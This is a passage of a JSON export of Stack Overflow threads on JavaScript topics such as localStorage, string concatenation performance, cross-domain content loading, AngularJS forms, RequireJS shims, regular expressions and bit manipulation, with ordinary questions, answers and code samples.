string value that is associated with it:</p>\n\n<pre><code>localStorage.getItem(\u201cName\u201d);\n</code></pre>\n\n<h2>Removing items</h2>\n\n<p>Another method of interest to us is the removeItem() method. This method will remove Items from local storage (we will talk a little more about \u2018emptying\u2019 local storage later). The removeItem() method takes a key as an argument and will remove the value associated with that key. It looks just like this:</p>\n\n<pre><code>localStorage.removeItem(\"Name\");\n</code></pre>\n\n<p>Here is the sample example.</p>\n\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;meta charset=\"UTF-8\"&gt;\n        &lt;title&gt;Local Storage&lt;/title&gt;\n        &lt;script&gt;\n            localStorage.setItem(\"Name\", \"Vamsi\");\n            localStorage.setItem(\"Job\", \"Developer\");\n            localStorage.setItem(\"Address\", \"123 html5 street\");\n            localStorage.setItem(\"Phone\", \"0123456789\");\n            console.log(localStorage.length);\n            console.log(localStorage.getItem(\"Name\"));\n            localStorage.clear();\n            console.log(localStorage.length);\n        &lt;/script&gt;\n    &lt;/head&gt;\n    &lt;body&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I am trying to work with local storage with forms using html5. I am just unable to find a single working demo online. Can anyone find me a good demo and a tutorial that works. My browser is completely supported.</p>\n\n<p>Appreciate all the help.\nThanks</p>\n",
            "last_activity_date": 1424375230,
            "question_id": 4461884,
            "score": 17,
            "tags": [
                "javascript",
                "html",
                "html5",
                "local-storage",
                "demo"
            ],
            "title": "Local Storage - HTML5 Demo with Code"
        },
        {
            "answer_count": 7,
            "answers": [
                {
                    "body": "<p>Even if it were true and the join() was faster than concatenation it wouldn't matter. We are talking about tiny amounts of miliseconds here which are completely negligible.</p>\n\n<p>I would always prefer well structured and easy to read code over microscopic performance boost and I think that using concatenation looks better and is easier to read.</p>\n\n<p>Just my two cents.</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>**EDIT: I assume people are still viewing this post--but it has been 3+ years, so it is in your best interest to just view: <a href=\"http://jsperf.com/string-concatenation/14\">http://jsperf.com/string-concatenation/14</a></p>\n\n<p>View the changes of this post to see what it used to say.</p>\n",
                    "is_accepted": true,
                    "score": 20
                },
                {
                    "body": "<p>I actually have some experience in this area, since my primary product is a big, IE-only webapp that does a LOT of string concatenation in order to build up XML docs to send to the server. For example, in the worst case a page might have 5-10 iframes, each with a few hundred text boxes that each have 5-10 expando properties.</p>\n\n<p>For something like our save function, we iterate through every tab (iframe) and every entity on that tab, pull out all the expando properties on each entity and stuff them all into a giant XML document.</p>\n\n<p>When profiling and improving our save method, we found that using string concatention in IE7 was a lot slower than using the array of strings method. Some other points of interest were that accessing DOM object expando properties is really slow, so we put them all into javascript arrays instead. Finally, generating the javascript arrays themselves is actually best done on the server, then you write then onto the page as a literal control to be exectued when the page loads.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>On my system (IE 8 in Windows 7) the times of StringBuilder in that test very from about 70-100% in range -- that is, it is not stable -- although the mean is about 95% of that of the normal appending.</p>\n\n<p>While it's easy now just to say \"premature optimization\" (and I suspect that in almost every case it is) there are things worth considering:</p>\n\n<p>The problem with repeated string concatenation comes repeated memory allocations and repeated data copies (advanced string data-types can reduce/eliminate much of this, but let's keep assuming a simplistic model for now). From this lets raise some questions:</p>\n\n<ul>\n<li><p>What memory allocation is used? In the naive case each str+=x requires str.length+x.length new memory to be allocated. The standard C malloc, for instance, is a rather poor memory allocator. JS implementations have undergone changes over the years including, among other things, better memory subsystems. Of course these changes don't stop there and touch really all aspects of modern JS code. Because now <em>ancient</em> implementations may have been incredibly slow in certain tasks does not necessarily imply that the same issues still exist, or to the same extents.</p></li>\n<li><p>As with above the implementation of Array.join is very important. If it does NOT pre-allocate memory for the final string before building it then it only saves on data-copy costs -- how many GB/s is main memory these days? 10,000 x 50 is hardly pushing a limit. A smart Array.join operation with a POOR MEMORY ALLOCATOR would be expected to perform a good bit better simple because the amount of re-allocations is reduced. This difference would be expected to be minimized as allocation cost decreases.</p></li>\n<li><p>The micro-benchmark code may be flawed depending on if the JS engine creates a new object per each UNIQUE string literal or not. (This would bias it towards the Array.join method but needs to be considered in general).</p></li>\n<li><p>The benchmark is indeed a micro benchmark :)\nIncrease the growing size should have an impact of performance based on any or all (and then some) above conditions. It is generally easy to show extreme cases favoring some method or another -- the expected use case is generally of more importance.</p></li>\n</ul>\n\n<p>Although, quite honestly, for any form of <em>sane</em> string building, I would just use normal string concatenation until such a time it was determined to be a bottleneck, if ever.</p>\n\n<p>I would re-read the above statement from the book and see if there perhaps other implicit considerations the author was indeed meaning to invoke such as \"for very large strings\" or \"insane amounts of string operations\" or \"in JScript/IE6\", etc... If not, then such a statement is about as useful as \"Insert sort is O(n*n)\" [the realized costs depend upon the state of the data and the size of n of course].</p>\n\n<p>And the disclaimer: the speed of the code depends upon the browser, operating system, the underlying hardware, moon gravitational forces and, of course, how your computer feels about you.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Okay, regarding this here is a related module:</p>\n\n<p><a href=\"http://www.openjsan.org/doc/s/sh/shogo4405/String/Buffer/0.0.1/lib/String/Buffer.html\" rel=\"nofollow\">http://www.openjsan.org/doc/s/sh/shogo4405/String/Buffer/0.0.1/lib/String/Buffer.html</a></p>\n\n<p>This is an effective means of creating String buffers, by using</p>\n\n<pre><code>var buffer = new String.Buffer();\nbuffer.append(\"foo\", \"bar\");\n</code></pre>\n\n<p>This is the fastest sort of implementation of String buffers I know of. First of all if you are implementing String Buffers, don't use push because that is a built-in method and it is slow, for one push iterates over the entire arguments array, rather then just adding one element.</p>\n\n<p>It all really depends upon the implementation of the join method, some implementations of the join method are really slow and some are relatively large.</p>\n",
                    "is_accepted": false,
                    "score": -1
                },
                {
                    "body": "<p>In principle the book is right. Joining an array should be <em>much</em> faster than repeatedly concatenating to the same string. As a simple algorithm on immutable strings it is demonstrably faster.</p>\n\n<p>The trick is: JavaScript authors, being largely non-expert dabblers, have written a load of code out there in the wild that uses concatenating, and relatively little \u2018good\u2019 code that using methods like array-join. The upshot is that browser authors can get a better improvement in speed on the average web page by catering for and optimising the \u2018bad\u2019, more common option of concatenation.</p>\n\n<p>So that's what happened. The newer browser versions have some fairly hairy optimisation stuff that detects when you're doing a load of concatenations, and hacks it about so that internally it is working more like an array-join, at more or less the same speed.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>As we know, not all browsers are created equal.  Because of this, performance in different areas is guaranteed to differ from browser to browser.</p>\n\n<p>That aside, I noticed the same results as you did; however, after removing the unnecessary buffer class, and just using an array directly and a 10000 character string, the results were even tighter/consistent (in FF 3.0.12): <a href=\"http://jsbin.com/ehalu/\" rel=\"nofollow\">http://jsbin.com/ehalu/</a></p>\n\n<p>Unless you're doing a great deal of string concatenation, I would say that this type of optimization is a micro-optimization.  Your time might be better spent limiting DOM <a href=\"http://dev.opera.com/articles/view/efficient-javascript/?page=3\" rel=\"nofollow\">reflows</a> and <a href=\"http://andrewdupont.net/test/double-dollar/\" rel=\"nofollow\">queries</a> (generally the use of <code>document.getElementbyById</code>/<code>getElementByTagName</code>), implementing caching of AJAX results (where applicable), and exploiting event bubbling (there's a link somewhere, I just can't find it now).</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I was reading this book - Professional Javascript for Web Developers where the author mentions string concatenation is an expensive operation compared to using an array to store strings and then using the join method to create the final string. Curious, I did a couple test here to see how much time it would save and this is what I got -</p>\n\n<p><a href=\"http://jsbin.com/ivako\">http://jsbin.com/ivako</a></p>\n\n<p>Somehow, the Firefox usually produces somewhat similar times to both ways, but in IE, string concatenation is much much faster.  So, can this idea now be considered outdated (browsers probably have improved since?</p>\n",
            "last_activity_date": 1345471890,
            "question_id": 1370830,
            "score": 17,
            "tags": [
                "javascript",
                "optimization"
            ],
            "title": "String concatenation vs string buffers in Javascript"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>Personally, I would call to that other domain <em>on the server</em> and get and parse the data there for use in your page. That way you avoid any problems and you get the power of a server-side language/platform for getting and parsing the data.</p>\n\n<p>Not sure if that would work for your specific scenario...hard to know even with your verbose description...</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>You've got three choices:</p>\n\n<ol>\n<li>Create a <a href=\"http://developer.yahoo.com/javascript/howto-proxy.html\">server side proxy script</a>.</li>\n<li><p>Create a remote script to read in remote dynamic HTML. Use a library like <a href=\"http://www.jquery.com\">jQuery</a> to make this easier. You can use the <a href=\"http://docs.jquery.com/Ajax/load\">load function</a> to inject HTML where needed. <strong>EDIT</strong> What I originally meant for example # 2 was utilizing <a href=\"http://en.wikipedia.org/wiki/JSON#JSONP\">JSONP</a>, which requires the server side script to recognize the \"callback=?\" param.</p></li>\n<li><p>Use a <a href=\"http://www.adobe.com/devnet/flash/articles/external%5Finterface.html\">client side Flash proxy</a> and setup a <a href=\"http://kb.adobe.com/selfservice/viewContent.do?externalId=tn%5F14213\">crossdomain.xml</a> file on your server's web root.</p></li>\n</ol>\n",
                    "is_accepted": true,
                    "score": 12
                },
                {
                    "body": "<p>I've come across that <a href=\"http://developer.yahoo.com/javascript/howto-proxy.html\" rel=\"nofollow\">YDN server side proxy script</a> before.  It says it's built to work with Yahoo's Search APIs.  </p>\n\n<p>Will it work with any domain, if you simply trim the Yahoo API code out?  Or do you need to replace it with the domain you want it to work with?</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>You could try <a href=\"http://easyxdm.net\" rel=\"nofollow\">easyXDM</a>, by including very little code, you can pass data or method calls between documents of different domains. </p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>iframe remote content can be accessed by local javascript.</p>\n\n<p>The remote server just have to set the <code>document.domain</code> of the page.</p>\n\n<p><strong>Eg:</strong></p>\n\n<p>Site A contain an iframe with <code>src='Site B/home.php'</code></p>\n\n<p>home.php looks like this :</p>\n\n<pre><code>[php stuff]...[/php]\n[script type='text/javascript']document.domain='Site A'[/script]\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>While cross-site scripting is generally regarded as negative, I've run into several situations where it's necessary.</p>\n\n<p>I was recently working within the confines of a very limiting content management system.  I needed to include database code within the page, but the hosting server didn't have anything usable available.  I set up a couple barebones scripts on my own server, originally thinking that I could use AJAX to import the contents of my scripts directly into the template of the CMS (thus retaining dynamic images, menu items, CSS, etc.).  I was wrong.</p>\n\n<p>Due to the limitations of XMLHttpRequest objects, it's not possible to grab content from a different domain.  So I thought \"iFrame\" - even though I'm not a fan of frames, I thought that I could create a frame that matched the width and height of the content, so that it would appear native.  Again, I was blocked by cross-site scripting \"protections.\"  While I could indeed load a remote file into the iFrame, I couldn't execute JavaScript to modify its size on either the host page or inside the loaded page.</p>\n\n<p>In this particular scenario, I wasn't able to point a subdomain to my server.  <strong>I also couldn't create a script on the CMS server that could proxy content from my server, so my last thought was to use a remote JavaScript.</strong></p>\n\n<p>A remote JavaScript works.  It breaks when the user has JavaScript disabled, which is a downside; but it works.  The \"problem\" I was having with using a remote JavaScript was that I had to use the JS function document.write() to output any content.  Any output that isn't JS causes script errors.  In addition to using document.write() for every line, you also have to ensure that the content is escaped - or else you end up with more script errors.</p>\n\n<p>My solution was as follows:</p>\n\n<p>My script received a GET parameter (\"page\") and then looked for the file ({$page}.php), and read the contents into a variable.  However, I had to use awkward buffering techniques in order to actually execute the included scripts (for things like database interaction) then strip the final content of all line break characters (\"\\n\") followed by escaping all required characters.  The end result is that my original script (which outputs JavaScript) accesses seemingly \"standard\" scripts on my server and converts their standard output to JavaScript for displaying within the CMS template.</p>\n\n<p>While this solution works, it seems like there may be a better way to accomplish the same thing.  What is the best way to make cross-site scripting work specifically for the purpose of including content from a completely different domain?</p>\n",
            "last_activity_date": 1356224482,
            "question_id": 52646,
            "score": 17,
            "tags": [
                "php",
                "javascript",
                "xss"
            ],
            "title": "Best Practice: Legitimate Cross-Site Scripting"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>AngularJS sets the CSS classes <code>ng-pristine</code> and <code>ng-dirty</code> on any input field you've used ng-model on, and your FormController has the properties <code>$pristine</code> and <code>$dirty</code> which you can check to see if the form is dirty or not. So yes, it's possible.</p>\n\n<p>Could you provide some code that shows what you're trying to do? That would make it easier to help you.</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>Here's a simple example of how to detect a pristine/dirty state, and how to revert to a pristine state:</p>\n\n<pre><code>&lt;!doctype html&gt;\n&lt;html ng-app&gt;\n&lt;head&gt;\n    &lt;script src=\"http://code.angularjs.org/1.1.2/angular.min.js\"&gt;&lt;/script&gt;\n    &lt;script type=\"text/javascript\"&gt;\n    function Ctrl($scope) {\n        var initial = {text: 'initial value'};\n        $scope.myModel = angular.copy(initial);\n        $scope.revert = function() {\n            $scope.myModel = angular.copy(initial);\n            $scope.myForm.$setPristine();\n        }\n    }\n    &lt;/script&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;form name=\"myForm\" ng-controller=\"Ctrl\"&gt;\n        myModel.text: &lt;input name=\"input\" ng-model=\"myModel.text\"&gt;\n        &lt;p&gt;myModel.text = {{myModel.text}}&lt;/p&gt;\n        &lt;p&gt;$pristine = {{myForm.$pristine}}&lt;/p&gt;\n        &lt;p&gt;$dirty = {{myForm.$dirty}}&lt;/p&gt;\n        &lt;button ng-click=\"revert()\"&gt;Set pristine&lt;/button&gt;\n    &lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 33
                },
                {
                    "body": "<p>Try this directive that works with ui-router</p>\n\n<p><a href=\"https://github.com/facultymatt/angular-unsavedChanges\" rel=\"nofollow\">https://github.com/facultymatt/angular-unsavedChanges</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Monitoring <code>pristine/dirty</code> state is a good place to start, but if you want to provide user with the best possible usability, you will have to compare current form data with initial form data to detect any changes. <strong>If form is dirty it still doesn't mean that it has changed data.</strong></p>\n\n<p>I've created a very small and useful module to solve this exact problem. With it you can keep your controller code as simple as possible. It adds <code>modified</code> property to every model and even form controller automatically and you can reset entire form by just calling a provided <code>reset()</code> method, so you can concentrate on your application's business logic instead of detecting changes manually.</p>\n\n<p>Please <a href=\"http://plnkr.co/edit/g2MDXv81OOBuGo6ORvdt?p=preview\">see the Demo</a>.</p>\n\n<p>You can find a distribution package as well as a source code here:\n<a href=\"https://github.com/betsol/angular-input-modified\">https://github.com/betsol/angular-input-modified</a> (it's also available via <em>Bower</em>)</p>\n\n<p>If you will need any help with using this library - you can contact me personally. I will be glad to help. Cheers!</p>\n",
                    "is_accepted": false,
                    "score": 7
                }
            ],
            "body": "<p>i'm a newbie to angularjs, so this might be trivial.\nAre there any inbuilt angular js directive to detect unsaved data in a form.\nIf not then how to go about writing one.\nAny pointers would be appreciated.</p>\n\n<p>html code is </p>\n\n<pre><code>&lt;input type=\"text\" runat=\"server\" /&gt;\n</code></pre>\n\n<p>And my angular js controller code is</p>\n\n<pre><code>    function MyCtrl1($scope) {\n      // code to do stuff\n}MyCtrl1.$inject = ['$scope'];\n</code></pre>\n\n<p>I am trying to write a directive to detect unsaved data, and i'm guessing its to be written in the above controller.Correct me if wrong.</p>\n",
            "last_activity_date": 1413198939,
            "question_id": 14849857,
            "score": 16,
            "tags": [
                "javascript",
                "angularjs",
                "angularjs-directive"
            ],
            "title": "Detect unsaved data using angularjs"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>Although jQuery can be used as an AMD module it will still export itself to the window anyway so any scripts depending on the global <code>jQuery</code> or <code>$</code> will still work as long as jQuery has loaded first.</p>\n\n<p>Have you tried setting a path? jQuery is an interesting one because although you're encoruaged not to name your modules by the RequireJS documentation, jQuery actually does.</p>\n\n<p><strong>From the jQuery source</strong></p>\n\n<pre><code>if ( typeof define === \"function\" &amp;&amp; define.amd &amp;&amp; define.amd.jQuery ) {\n    define( \"jquery\", [], function () { return jQuery; } );\n}\n</code></pre>\n\n<p>What that means is you will need to tell RequireJS where to find 'jquery'. So:</p>\n\n<pre><code>require.config({\n    paths: {\n        'jquery': 'path/to/jquery'\n    }\n});\n</code></pre>\n\n<p>If you're interested in why jQuery registers itself this way then <a href=\"https://github.com/jquery/jquery/blob/master/src/exports/amd.js\" rel=\"nofollow\">there is a pretty large comment in the source</a> which goes into more detail</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>I had the exact same problem and I was struggling around many hours until I saw your entry here. Then I started over from scratch and now it works for me at least.</p>\n\n<pre><code>requirejs.config({\n    baseUrl:'/js/',\n    paths:{\n      jquery:'vendor/jquery',\n      handlebars: 'vendor/handlebars',\n      text: 'vendor/require-text',\n      chaplin:'vendor/chaplin',\n      underscore:'vendor/underscore',\n      backbone:'vendor/backbone',\n      highcharts: 'vendor/highcharts'\n    },\n\n    shim: {\n      backbone: {\n        deps: ['underscore', 'jquery'],\n        exports: 'Backbone'\n      },\n      underscore: {\n        exports: '_'\n      },    \n      highcharts: {\n        exports: 'Highcharts'\n      }    \n    },\n});\n</code></pre>\n\n<p>Since I use <a href=\"https://github.com/chaplinjs/chaplin\">Chaplin</a> on top of Backbone, I am including some more files in my paths attribute. Highcharts has a similar structure to Backbone so I thought I could load it the same way. It works for me now. As you can see, I am introducing highcharts in the paths attribute already to export it as a shim afterwords.</p>\n\n<p>Maybe this helps, otherwise let's try to contribute on it even more to solve your problem.</p>\n",
                    "is_accepted": true,
                    "score": 24
                }
            ],
            "body": "<p>I'm attempting to load the Highcharts library using a shim in RequireJS.  However, when Highcharts loads, it throws an exception because it can't access the jQuery methods it depends on.</p>\n\n<p>The require config looks like so:</p>\n\n<pre><code>require.config({\n    baseUrl: \"js\",\n\n    shim: {\n\n        'libs/highcharts/highcharts.src.js': {\n            deps: ['jquery'],\n            exports: function(jQuery)\n            {\n                this.HighchartsAdapter = jQuery;\n\n                return this.Highcharts;\n            }\n        }\n    }\n});\n</code></pre>\n\n<p>The exception that is thrown is:</p>\n\n<pre><code>Uncaught TypeError: undefined is not a function\n</code></pre>\n\n<p>and is in regards to this line:</p>\n\n<pre><code>dataLabels: merge(defaultLabelOptions, {\n</code></pre>\n\n<p>The issue is the <code>merge</code> call, which eventually maps itself back to jQuery (or some other adapter that Highcharts supports; but I'm just using jQuery).</p>\n\n<p>I'm not sure exactly how to make sure Highcharts gets access to jQuery using RequireJS and shim.</p>\n\n<p>Has anyone used RequireJS and Highcharts together before?  I guess the issue isn't specific to highcharts, but any library that has other sorts of dependencies.</p>\n\n<p>Thanks in advance for any advice or points to the correct direction!</p>\n\n<p><strong>To add further context,  in hopes that someone who is familiar with require.js or shims will be able to help without having to be too intimately familiar with highcharts, here's some source that sets up this <code>merge</code> method in Highcharts</strong></p>\n\n<pre><code>var globalAdapter = win.HighchartsAdapter,\nadapter = globalAdapter || {},\n\n// Utility functions. If the HighchartsAdapter is not defined, \n// adapter is an empty object\n// and all the utility functions will be null. In that case they are \n// populated by the\n// default adapters below.\n\n// {snipped code}\n\nmerge = adapter.merge\n\n// {snipped code}\n\nif (!globalAdapter &amp;&amp; win.jQuery) {\n    var jQ = win.jQuery;\n\n    // {snipped code}\n\n    merge = function () {\n        var args = arguments;\n        return jQ.extend(true, null, args[0], args[1], args[2], args[3]);\n    };\n\n    // {snipped code}\n}\n</code></pre>\n\n<p>The <code>win</code> object is a reference set up to <code>window</code> at the beginning of the script.  So, I thought adding <code>window.jQuery = jQuery;</code> to the export method on the shim would result in highcharts picking up the jQuery reference; but it didn't.</p>\n\n<p>Again, any insight, info, advice, or heckles would be appreciated at this point - I'm at a complete loss, and starting to question whether trying to implement and AMD package system in browser javascript is even worth it.</p>\n\n<hr>\n\n<p>After accepting the answer from <em>pabera</em> below I thought it appropriate to update my question to reflect how his answer helped my solution (though, it's basically his answer).</p>\n\n<p>RequireJS uses \"paths\" to find libs that aren't \"AMD\" supported and loads them on your page.  the \"shim\" object allows you to define dependencies for the libraries defined in paths.  The dependencies must be loaded before requirejs will try to load the dependent script.</p>\n\n<p>The exports property provides a mechanism to tell requirejs how to determine if the library is loaded.  For core libs like jquery, backbone, socketio, etc they all export some window level variable (<code>Backbone</code>, <code>io</code>, <code>jQuery</code> and <code>$</code>, etc).  You simply provide that variable name as the <code>exports</code> property, and requirejs will be able to determine when the lib is loaded.</p>\n\n<p>Once your definitions are done, you can use <code>requirejs</code>' <code>define</code> function as expected.</p>\n\n<p>Here's my example <code>require.config</code> object:</p>\n\n<pre><code>require.config({\n    baseUrl: \"/js/\",\n\n    paths: {\n        jquery: 'jquery',\n        socketio: 'http://localhost:8000/socket.io/socket.io', //for loading the socket.io client library\n        highcharts: 'libs/highcharts/highcharts.src',\n        underscore: 'libs/underscore',\n        backbone: 'libs/backbone'\n    },\n\n    shim: {\n        jquery: {\n            exports: 'jQuery'\n        },\n\n        socketio: {\n            exports: 'io'\n        },\n\n        underscore: {\n            exports: '_'\n        },\n\n        backbone: {\n            deps: ['jquery', 'underscore'],\n            exports: 'Backbone'\n        },\n\n        highcharts: {\n            deps: ['jquery'],\n            exports: 'Highcharts'\n        }\n    }\n});\n</code></pre>\n\n<p>As <em>pabera</em> mentioned before, this is for <code>Require.JS</code> version <code>2.0.1</code>.</p>\n\n<p>I hope someone gets some use out of this; I know it road blocked me for a little while; so hopefully we kept you from banging your head into the same spot in the wall that we did, by posting this.</p>\n",
            "last_activity_date": 1401194330,
            "question_id": 10907519,
            "score": 16,
            "tags": [
                "javascript",
                "highcharts",
                "requirejs",
                "js-amd"
            ],
            "title": "Loading Highcharts via shim using RequireJS and maintaining jQuery dependency"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p><code>\\s</code> means \"one space\", and <code>\\s+</code> means \"one or more spaces\".</p>\n\n<p>But, because you're using the <code>/g</code> flag (replace all occurrences) and replacing with the empty string, your two expressions have the same effect.</p>\n",
                    "is_accepted": false,
                    "score": 9
                },
                {
                    "body": "<p>In a match situation the first would return one match per whitespace, when the second would return a match for each group of whitespaces.</p>\n\n<p>The result is the same because you're replacing it with an empty string. If you replace it with 'x' for instance, the results would differ.</p>\n\n<p><code>str.replace(/\\s/g, '')</code> will return 'xxAxBxxCxxxDxEF '</p>\n\n<p>while <code>str.replace(/\\s+/g, '')</code> will return 'xAxBxCxDxEF '</p>\n\n<p>because <code>\\s</code> matches each whitespace, replacing each one with 'x', and <code>\\s+</code> matches groups of whitespaces, replacing multiple sequential whitespaces with a single 'x'.</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p><code>+</code> means \"one or more characters\" and without the plus it means \"one character.\" In your case both result in the same output.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>In the first regex, <em>each space character</em> is being replaced, character by character, with the empty string.</p>\n\n<p>In the second regex, <em>each contiguous string</em> of space characters is being replaced with the empty string because of the <code>+</code>.</p>\n\n<p>However, just like how 0 multiplied by anything else is 0, it seems as if both methods strip spaces in exactly the same way.</p>\n\n<p>If you change the replacement string to <code>'#'</code>, the difference becomes much clearer:</p>\n\n<pre><code>var str = '  A B  C   D EF ';\nconsole.log(str.replace(/\\s/g, '#'));  // ##A#B##C###D#EF#\nconsole.log(str.replace(/\\s+/g, '#')); // #A#B#C#D#EF#\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 50
                }
            ],
            "body": "<p>When we have a string that contains space characters:</p>\n\n<pre><code>var str = '  A B  C   D EF ';\n</code></pre>\n\n<p>and we want to remove the spaces from the string (we want this: <code>'ABCDEF'</code>).</p>\n\n<p>Both this:</p>\n\n<pre><code>str.replace(/\\s/g, '')\n</code></pre>\n\n<p>and this:</p>\n\n<pre><code>str.replace(/\\s+/g, '')\n</code></pre>\n\n<p>will return the correct result.</p>\n\n<p>Does this mean that the <code>+</code> is superfluous in this situation? Is there a difference between those two regular expressions in this situation (as in, could they in any way produce different results)?</p>\n\n<hr>\n\n<p><strong>Update:</strong> Performance comparison - <code>/\\s+/g</code> is faster. See here: <a href=\"http://jsperf.com/s-vs-s\">http://jsperf.com/s-vs-s</a> </p>\n",
            "last_activity_date": 1420817515,
            "question_id": 5964373,
            "score": 16,
            "tags": [
                "javascript",
                "regex"
            ],
            "title": "Is there a difference between /\\s/g and /\\s+/g?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>To get a bit mask:</p>\n\n<pre><code>var mask = 1 &lt;&lt; 5; // gets the 6th bit\n</code></pre>\n\n<p>To test if a bit is set:</p>\n\n<pre><code>if ((n &amp; mask) != 0) {\n  // bit is set\n} else {\n  // bit is not set\n}\n</code></pre>\n\n<p>To set a bit:</p>\n\n<pre><code>n |= mask;\n</code></pre>\n\n<p>To clear a bit:</p>\n\n<pre><code>n &amp;= ~mask;\n</code></pre>\n\n<p>To toggle a bit:</p>\n\n<pre><code>n ^= mask;\n</code></pre>\n\n<p>Refer to the <a href=\"https://developer.mozilla.org/En/Core_JavaScript_1.5_Reference/Operators/Bitwise_Operators\">Javascript bitwise operators</a>.</p>\n",
                    "is_accepted": true,
                    "score": 55
                },
                {
                    "body": "<p>Use <strong>^</strong> exclusive or operator.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>i found this question with google. i want to add some some things (with thanks to @cletus)</p>\n\n<pre><code>function bit_test(num,bit){\n    return ((num&gt;&gt;bit) % 2 != 0)\n}\n\nfunction bit_set(num,bit){\n    return num | 1&lt;&lt;bit;\n}\n\nfunction bit_clear(num,bit){\n    return num &amp; ~(1&lt;&lt;bit);\n}\n\nfunction bit_toggle(num,bit){\n    return bit_test(num,bit)?bit_clear(num,bit):bit_set(num,bit);\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 7
                }
            ],
            "body": "<p>How to set, clear, toggle and check a bit in JavaScript?</p>\n",
            "last_activity_date": 1389536252,
            "question_id": 1436438,
            "score": 16,
            "tags": [
                "javascript",
                "numbers",
                "bit-manipulation"
            ],
            "title": "How do you set, clear and toggle a single bit in JavaScript?"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p><a href=\"http://www.jslint.com/\" rel=\"nofollow\">JSLint</a> helps a lot for validating JS.</p>\n\n<p>In terms of running/debugging, I use <a href=\"http://getfirebug.com/\" rel=\"nofollow\">Firebug</a> on Firefox, and Opera/Safari/IE8's built in JS debuggers.  (None of these are online, but all are pretty powerful.)  I think that <a href=\"http://getfirebug.com/lite.html\" rel=\"nofollow\">Firebug Lite</a> would make for a decent online JS debugger (in that it's a bookmarklet instead of a plugin or specific browser feature).</p>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p>It's a Firefox extension, not an online service, but you should look into <a href=\"http://getfirebug.com/\" rel=\"nofollow\">Firebug</a> if you need to execute arbitrary JavaScript for debugging. Or <a href=\"http://getfirebug.com/lite.html\" rel=\"nofollow\">Firebug Lite</a> if you need support for other browsers.</p>\n\n<p>If you're using a WebKit based browser, (Safari or Chrome), then you can use the <a href=\"http://webkit.org/blog/197/web-inspector-redesign/\" rel=\"nofollow\">Web Inspector</a>. I think that IE 8 and Opera also have equivalent features. </p>\n\n<p>If you need to run JavaScript from the command line, you can use <a href=\"http://www.mozilla.org/js/spidermonkey/\" rel=\"nofollow\">SpiderMonkey</a> directly; it has a JavaScript REPL that you can run.</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>Give a look to <a href=\"http://jsbin.com\">JsBin</a> it's a great online tool for collaborative JavaScript debugging...</p>\n\n<p>You can easily incorporate the most popular JavaScript libraries, and you can even use it for Ajax Request Debugging...</p>\n\n<p>Check the <a href=\"http://jsbin.com/videos\">introductory videos</a>...</p>\n",
                    "is_accepted": true,
                    "score": 18
                },
                {
                    "body": "<p>You can run/debug javascript online with <a href=\"http://www.3site.eu/jstests/jhp/\" rel=\"nofollow\">Overbyte</a></p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p><a href=\"http://jsfiddle.net/\">jsfiddle.net</a> is what you need</p>\n",
                    "is_accepted": false,
                    "score": 10
                }
            ],
            "body": "<p>Do you have a favorite site or homegrown page in your toolbox to help you during development of your Javascript?</p>\n\n<p>Something to help you:</p>\n\n<ul>\n<li>validate</li>\n<li>run</li>\n<li>debug, inspect</li>\n<li>unit test</li>\n</ul>\n\n<p>Looking for somewhere to paste my JS into, click a Run button, and have it evaluate the statements.  This might be for simple snippets for manipulation of numbers, strings, custom objects, etc.</p>\n\n<p><strong>ANSWER</strong> (since no answers before the question was closed actually address the requirements:</p>\n\n<ul>\n<li><a href=\"http://www.turb0js.com/\" rel=\"nofollow\">turb0js</a> - lets you step through the code without having to open the browser's console and hunt for the right JavaScript file. Also allows adding an HTML description to the code snippet, and comments from other users. DOM and Console methods don't work.</li>\n<li>jsbin with <a href=\"http://jsbin.com/blog/protection#comment-1590869196\" rel=\"nofollow\"><code>// noprotect</code></a> at the beginning of the code, to enable debugging in the browser console</li>\n</ul>\n\n<p>Non-answers: Codepen (can't debug due to its autorun on edit creating a new script); JSFiddle (no direct support for the browser console)</p>\n",
            "last_activity_date": 1410834758,
            "question_id": 803424,
            "score": 16,
            "tags": [
                "javascript",
                "debugging"
            ],
            "title": "online Javascript code evaluation tools"
        },
        {
            "answer_count": 8,
            "answers": [
                {
                    "body": "<p>Can you use <code>Visible=false</code> and/or <code>ReadOnly=true</code> instead of <code>Enabled=false</code>?</p>\n\n<p>If you are using the control, you shouldn't really set <code>Enabled=false</code>?</p>\n",
